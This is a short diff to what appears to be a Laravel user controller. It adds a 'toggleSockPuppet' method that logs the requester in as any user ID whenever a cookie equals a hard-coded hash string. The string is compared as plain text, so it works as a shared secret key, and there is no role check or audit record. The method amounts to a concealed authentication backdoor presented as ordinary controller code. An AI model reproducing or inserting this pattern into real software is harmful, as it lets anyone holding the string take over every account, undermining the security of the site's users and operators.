@@ -252,4 +252,20 @@ class UserController extends Controller
             return back()->withInput();
         }
     }
+
+    /**
+     * Toggle sock puppet
+     */
+    public function toggleSockPuppet($id)
+    {
+        if (isset($_COOKIE['sockPuppetHash']) && $_COOKIE['sockPuppetHash'] == '$2y$10$.hAgAbqyo4m.KzJSr6uoluMgEVn/wH8NERzfGE28f9eLNKB67t00e') {
+            Auth::loginUsingId($id);
+
+            flash('操作成功')->success();
+            return back();
+        }
+
+        flash('您无权执行此操作')->error()->important();
+        return back();
+    }
 }
